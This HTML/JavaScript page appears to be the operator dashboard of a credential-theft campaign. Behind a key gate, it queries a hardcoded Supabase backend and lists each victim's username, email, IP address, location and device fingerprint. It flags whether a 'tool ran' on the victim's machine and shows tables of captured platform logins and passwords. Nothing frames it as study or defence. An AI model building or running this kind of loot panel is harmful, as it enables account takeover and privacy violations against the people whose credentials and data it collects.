<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>portal feed</title>
<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
<script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
<style>
:root{--ink:#07070a;--panel:#0e0e13;--line:#20202b;--text:#eef0f4;--mut:#8b8fa0;--dim:#63677a;--vi:#a855f7;--ok:#3ddc97;--bad:#f4677f;--mono:"JetBrains Mono",monospace}
*{box-sizing:border-box}
body{margin:0;background:var(--ink);color:var(--text);font-family:var(--mono);font-size:12px}
header{display:flex;gap:10px;align-items:center;padding:12px 16px;border-bottom:1px solid var(--line)}
.brand{font-weight:500;letter-spacing:.12em;font-size:12px}
.brand b{color:var(--vi)}
input{background:#0a0a0e;border:1px solid var(--line);color:var(--text);padding:7px 10px;font:inherit}
input:focus{outline:none;border-color:var(--vi)}
button{background:#17171f;border:1px solid var(--line);color:var(--text);font:inherit;padding:7px 12px;cursor:pointer}
button:hover{border-color:var(--vi)}
main{padding:14px 16px 60px}
.card{border:1px solid var(--line);background:var(--panel);margin-bottom:12px;border-radius:4px;overflow:hidden}
.head{padding:10px 12px;display:flex;gap:12px;align-items:baseline;flex-wrap:wrap;border-bottom:1px solid var(--line)}
.head .who{font-size:13px;color:#fff}
.head .when{color:var(--dim);font-size:10.5px}
.tag{font-size:10px;border:1px solid var(--line);padding:1px 6px;color:var(--mut)}
.tag.ok{border-color:#1f6b47;color:var(--ok)}
.tag.bad{border-color:#6b2836;color:var(--bad)}
.body{padding:10px 12px}
table{width:100%;border-collapse:collapse;margin:6px 0}
td,th{text-align:left;padding:4px 6px;border-bottom:1px solid #17171f;font-size:11.5px}
th{color:var(--dim);font-weight:400}
.pw{color:var(--vi)}
pre{white-space:pre-wrap;word-break:break-word;color:var(--mut);font-size:10.5px;margin:8px 0 0;max-height:190px;overflow:auto}
.kv{color:var(--dim);font-size:11px}
.hidden{display:none}
#gate{max-width:400px;margin:14vh auto;padding:22px;border:1px solid var(--line);background:var(--panel)}
h1{font-size:16px;margin:0 0 12px;font-weight:500}
.err{color:var(--bad);font-size:11px;min-height:14px;margin-top:8px}
</style>
</head>
<body>

<div id="gate">
  <h1>feed key</h1>
  <input id="key" type="password" placeholder="key" style="width:100%" autocomplete="current-password">
  <button id="open" style="width:100%;margin-top:10px">Open</button>
  <div class="err" id="err"></div>
  <p style="color:var(--dim);font-size:10.5px;margin-top:12px">Stays in this browser.</p>
</div>

<header class="hidden" id="bar">
  <div class="brand">PORTAL <b>FEED</b></div>
  <span id="count" style="color:var(--dim);font-size:11px"></span>
  <span style="flex:1"></span>
  <button id="refresh">refresh</button>
  <button id="auto">auto: off</button>
</header>

<main class="hidden" id="list"></main>

<script>
const db = window.supabase.createClient(
  "https://bytpztfhwdcuqozdzjeu.supabase.co",
  "sb_publishable_FIx91UXDrhOyXAQ5mJ5kaw_6xrk1ZiV"
);
const $ = id => document.getElementById(id);
let key = localStorage.getItem("portal_key") || "", runs = [], timer = null;
const esc = s => String(s == null ? "" : s).replace(/[&<>"']/g, c => ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]));
const stamp = ts => { if(!ts) return "—"; const d = new Date(ts);
  return String(d.getDate()).padStart(2,"0") + "/" + String(d.getMonth()+1).padStart(2,"0") + " " +
         String(d.getHours()).padStart(2,"0") + ":" + String(d.getMinutes()).padStart(2,"0"); };

function render(){
  $("count").textContent = runs.length + " runs";
  $("list").innerHTML = runs.map(r => {
    const t = r.tool || {}, g = t.geo || {};
    const codes = (r.codes || []).map(c =>
      `<tr><td>${esc(c.platform)}</td><td>${esc(c.login)}</td><td class="pw">${esc(c.secret)}</td><td class="kv">${stamp(c.at)}</td></tr>`).join("");
    return `<div class="card">
      <div class="head">
        <span class="who">${esc(r.username || "?")}</span>
        <span class="kv">${esc(r.email || "")}</span>
        <span class="pw">${esc(r.code || "")}</span>
        <span class="when">${stamp(r.created_at)}</span>
        <span class="kv">${esc(g.city || r.city || "")} ${esc(g.country || r.country || "")}</span>
        <span class="kv">${esc(t.platform || "")} ${esc(t.architecture || "")}</span>
        ${r.beaconed_at ? '<span class="tag ok">tool ran</span>' : '<span class="tag bad">link only</span>'}
        ${(r.codes||[]).length ? `<span class="tag ok">${r.codes.length} codes</span>` : ""}
      </div>
      <div class="body">
        <div class="kv">ip ${esc(r.ip || "?")} · screen ${esc(t.screen || "?")} · gpu ${esc((t.gpu||"?").slice(0,48))} · tz ${esc(t.tz || "?")}</div>
        ${codes ? `<table><tr><th>platform</th><th>login</th><th>password</th><th>when</th></tr>${codes}</table>` : ""}
        <button onclick="this.nextElementSibling.classList.toggle('hidden')">raw</button>
        <pre class="hidden">${esc(JSON.stringify(r.tool || r.meta, null, 1))}</pre>
      </div>
    </div>`;
  }).join("") || '<p style="color:var(--dim)">nothing yet</p>';
}

async function load(){
  if (!key) return;
  const { data, error } = await db.rpc("test_feed", { p_key: key });
  if (error) { $("err").textContent = error.message; return; }
  runs = data || [];
  render();
}

$("open").addEventListener("click", async () => {
  key = $("key").value.trim();
  const { error } = await db.rpc("test_feed", { p_key: key });
  if (error) return $("err").textContent = "wrong key";
  localStorage.setItem("portal_key", key);
  $("gate").classList.add("hidden");
  $("bar").classList.remove("hidden");
  $("list").classList.remove("hidden");
  load();
  timer = setInterval(load, 10000);
});

$("refresh").addEventListener("click", load);
$("auto").addEventListener("click", e => {
  if (timer) { clearInterval(timer); timer = null; e.target.textContent = "auto: off"; }
  else { timer = setInterval(load, 10000); e.target.textContent = "auto: on"; }
});

(async () => {
  if (!key) return;
  const { error } = await db.rpc("test_feed", { p_key: key });
  if (!error) {
    $("gate").classList.add("hidden");
    $("bar").classList.remove("hidden");
    $("list").classList.remove("hidden");
    load();
    timer = setInterval(load, 10000);
  }
})();
</script>
</body>
</html>
